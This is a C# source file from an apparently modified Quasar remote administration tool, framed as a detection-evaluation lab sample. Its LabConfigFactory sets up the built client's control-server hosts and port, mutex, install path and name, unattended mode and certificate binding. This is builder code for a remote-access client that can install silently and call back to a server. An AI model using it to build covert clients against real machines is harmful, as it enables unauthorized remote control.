// ---------------------------------------------------------------------------
// Quasar 检测评估实验台 · 实验室基线样本（Quasar-LabBaseline）
// 作者：陈森（Chen Sen）  https://github.com/chendashi666
// 本文件由陈森创作或改造：禁止盗卖，禁止商业用途。
// 上游 Quasar 代码版权归 MaxXor 及 Quasar 贡献者所有（MIT License）。
// ---------------------------------------------------------------------------

using Quasar.Common.Config;
using Quasar.Common.Cryptography;
using Quasar.Common.Properties;
using Quasar.Server.Models;
using System;
using System.Globalization;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;

namespace Quasar.Server.Build
{
    /// <summary>
    /// Creates the external laboratory configuration which accompanies a built client.
    /// The configuration carries the same server certificate binding the upstream builder stamps
    /// into the client, so the produced baseline verifies the control server identically and
    /// nothing has to be downgraded for the laboratory run.
    /// </summary>
    public static class LabConfigFactory
    {
        /// <summary>
        /// Builds a configuration from the build options, deriving the port of the first host entry.
        /// </summary>
        public static LabConfig FromBuildOptions(BuildOptions options)
        {
            if (options == null)
                throw new ArgumentNullException("options");

            var config = new LabConfig
            {
                LabName = LabStrings.LabName,
                Hosts = options.RawHosts ?? string.Empty,
                Port = ExtractFirstPort(options.RawHosts),
                Mutex = options.Mutex ?? string.Empty,
                Tag = options.Tag ?? string.Empty,
                Subnet = string.Empty,
                ReconnectDelay = options.Delay,
                LogDirectoryName = string.IsNullOrEmpty(options.LogDirectoryName)
                    ? LabStrings.DefaultLogDirectory
                    : options.LogDirectoryName,
                InstallSubDirectory = string.IsNullOrEmpty(options.InstallSub)
                    ? LabStrings.DefaultInstallSubDirectory
                    : options.InstallSub,
                InstallName = string.IsNullOrEmpty(options.InstallName)
                    ? LabStrings.DefaultClientName
                    : options.InstallName,
                UnattendedMode = options.UnattendedMode
            };

            return WithCertificateBinding(config);
        }

        /// <summary>
        /// Fills the certificate binding of the configuration from the laboratory certificate
        /// authority stored next to the control console (quasar.p12).
        /// </summary>
        public static LabConfig WithCertificateBinding(LabConfig config)
        {
            if (config == null)
                throw new ArgumentNullException("config");

            // The laboratory authority is created on demand: a prebuilt toolkit must work on a
            // machine which never ran the build pipeline.
            bool created;
            var caCertificate = LabCertificate.Ensure(Quasar.Server.Models.Settings.CertificatePath,
                LabCertificate.DefaultSubject, LabCertificate.DefaultKeyStrength, out created);
            var serverCertificate = new X509Certificate2(caCertificate.Export(X509ContentType.Cert));

            var key = serverCertificate.Thumbprint;
            config.ServerCertificateBase64 = Convert.ToBase64String(serverCertificate.Export(X509ContentType.Cert));
            config.EncryptionKey = key;

            using (var csp = (RSACryptoServiceProvider) caCertificate.PrivateKey)
            {
                var hash = Sha256.ComputeHash(Encoding.UTF8.GetBytes(key));
                config.ServerSignatureBase64 = Convert.ToBase64String(csp.SignHash(hash, CryptoConfig.MapNameToOID("SHA256")));
            }

            return config;
        }

        /// <summary>
        /// Returns the port of the first well formed "host:port" entry, or 4782 when absent.
        /// </summary>
        public static int ExtractFirstPort(string rawHosts)
        {
            const int defaultPort = 4782;
            if (string.IsNullOrWhiteSpace(rawHosts))
                return defaultPort;

            foreach (var entry in rawHosts.Split(';'))
            {
                if (string.IsNullOrWhiteSpace(entry) || entry.IndexOf(':') < 0)
                    continue;

                var candidate = entry.Trim();
                var lastColon = candidate.LastIndexOf(':');
                int port;
                if (int.TryParse(candidate.Substring(lastColon + 1), NumberStyles.Integer, CultureInfo.InvariantCulture, out port) &&
                    port > 0 && port <= 65535)
                    return port;
            }

            return defaultPort;
        }
    }
}
